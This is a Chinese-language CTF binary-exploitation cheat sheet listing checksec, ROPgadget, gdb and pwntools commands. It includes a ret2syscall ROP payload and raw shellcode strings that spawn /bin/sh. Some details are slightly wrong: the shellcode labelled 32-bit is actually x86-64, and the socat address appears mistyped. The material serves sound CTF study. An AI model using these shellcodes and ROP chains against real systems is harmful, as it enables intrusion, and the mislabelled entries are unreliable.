# PWN快查手册





## checksec

```bash
checksec pwn
```







## ldd查询动态链接库

查询链接库：

```
ldd pwn
```



## objdump

反汇编成汇编代码

```bash
objdump -d pwn | less
```



查询plt表中的函数

```
objdump -d -j .plt pwn
```



## ROPgadget工具



read足够大的时候，可以直接一把梭

```
ROPgadget --binary pwn --ropchain
```



查找pwn程序中的rdi寄存器的地址

```bash
ROPgadget --binary ./pwn --only "pop|ret" | grep "rdi"
```

```bash
ROPgadget --binary ./pwn --only "ret"
```





查找库中的字符串，找pwn程序中的也可以

```bash
ROPgadget --binary pwn --string '/bin/sh'
```



```bash
ROPgadget --binary libc.so --string '/bin/sh'
```



## ret2syscall

such as下面的ret2syscall：64位就是syscall  32位就是int     0x80（五个空格）

```python
# 64位
payload = flat([pop_rax_ret , 0 , pop_rdi_ret , 0 , pop_rsi_ret , bin_sh_addr , pop_rdx_ret , 8 , syscall_addr])
payload += flat([pop_rax_ret , 0x3b , pop_rdi_ret , bin_sh_addr , pop_rsi_ret , 0 , pop_rdx_ret , 0 , syscall_addr])
r.send(b'/bin/sh\x00')
```



int 0x80要带ret，，32位就是read然后execve







## 本地缺少libc库

少库：

```
sudo apt-get install lib32stdc++6
```







## ==gdb调试==

要是想要双屏显示的话，第二个gdb要set,通过指令tty来查看，写在`~/.gdbinit`里面,这样子就可以一个显示一个操作了！！！

```
set context-output /dev/pts/0
```



```
gdb pwn

b main    # main函数下断点

info b # 查看当前断点

r    # 运行，就是运行整个程序，没有调试功能

start   # 运行到程序入口

i r   # 查看寄存器，但是要start才能用

c     # 让程序继续执行到下一个断点或者结束

ni     # 执行到当前函数的下一条指令

si   # 单步步入

fin     # 执行至当前函数结束  全称finish

vmmap     # 显示虚拟内存空间的分布

tele 0x??????  # 查看这个内存中存储的内容

p &printf    # 查看printf函数的真实地址

p &__bss_start    # 查看bss段起始位置

p $rbp			# 打印指定寄存器的值
stack 40    # 查看栈上的空间

heap   # 查看堆信息

xinfo 地址    # 查看该地址信息，包括偏移

info variables    # 查看所有变量信息

hexdump 地址 大小    # 查看堆块分布  

x/20b $rbp-0x10   # 看寄存器地址-0x10的20个bytes的值

x/20s $rbp      #  查看rbp寄存器的值及后面20位，但是以字符串形式显示

x/20i $rip   # 从rip寄存器开始编译汇编后面20行
x/20g $rbp      #  查看rbp寄存器的值及后面20位，但是8个字节显示
x/20b $rbp      #  查看rbp寄存器的值及后面20位，但是1个字节显示
x/20w $rbp      #  查看rbp寄存器的值及后面20位，但是4个字节显示
x/20x $rbp      #  查看rbp寄存器的值及后面20位，但是以十六进制显示
x/20d $rbp      #  查看rbp寄存器的值及后面20位，但是以十进制显示

set *地址=0x61    # 让这个地址的值等于0x61

q   # 退出gdb

```



## cyclic算真正的偏移量

gdb调试

```
cyclic 255
// 生成一个很长的字符串

r
// 运行程序

cyclic -l 一个无效地址
// 得到真正的偏移量
```









## ShellCode-asm&&shellcraft

shellcraft

内置了一系列的字节shellcode，并且能根据实际来进行匹配相应的shellcode

```python
from pwn import *    
[[pwntool生成shellcode]]
shellcode=asm(shellcraft.sh())
```







自己写的，较小的，



32位Linux的

```
shellcode_x86=b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```



64位Linux的24Byte的ShellCode：

```
shellcode_x64 ="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```



64位Linux的23Byte的shellcode：

```
shellcode_x64 ="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```



## flat

扁平化，免去经常写b'a' 、str( )、p32、p64的困扰，自动构建符合要求的payload。

```
payload = flat([pop_rax_ret , 0 , pop_rdi_ret , 0 , pop_rsi_ret , bin_sh_addr , pop_rdx_ret , 8 , syscall_addr])
```





## file

和checksec差不多，只不过更全，有hash值和ldd的功能

```bash
file pwn
```



## readelf

查看elf文件信息

```bash
readelf -A pwn | less
```



## strings

strings查看文件字符串，pwn中不常用，misc里面可能有非预期

```
strings pwn | less
```



## hexdump

查看十六进制，基本不用

```
hexdump pwn | less
```



## nm

查看函数表，基本不用

```bash
nm pwn
```



## 查看系统调用号

如果是断网ctf，那就直接查看自己电脑的系统调用号

```
less /usr/include/x86_64-linux-gnu/asm/unistd_64.h

less /usr/include/x86_64-linux-gnu/asm/unistd_32.h
```

因为这里无法全部查询到arm、x86、x64的



如果是网上，那就直接点链接：

https://syscall.sh/



## 端口部署pwn

如果想要你的pwn程序作为试题部署在你的服务器某个端口你可以：

```
socat tcp-1:8888,fork exec:./pwn,reuseaddr
```





## SSH链接

```python
from pwn import *

session = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0')

r = session.process('sh', env={"PS1":""})
r.sendline('echo Hello, world!')
r.recvline()
```



